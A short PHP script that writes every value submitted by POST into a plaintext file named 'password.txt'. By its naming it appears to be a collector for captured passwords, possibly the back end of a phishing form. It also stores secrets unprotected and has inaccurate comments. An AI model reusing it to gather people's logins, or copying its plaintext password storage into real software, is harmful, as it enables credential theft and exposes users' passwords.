<?php
    $file = 'password.txt';  							// Creates filename
    $arr = $_POST;  									// Creates file post
    echo $_POST;    									// Echoes post to java
    $fp = fopen($file, 'w') or die ("can't open file"); // Attempt to open file
    foreach ($arr as $key => $value){       			// Goes through each argument
        $toFile = "$value\n";           				// Sends line to file
        fwrite($fp, "$toFile");         				// Writes to file
    }
    fclose($fp);    									// Closes file
?>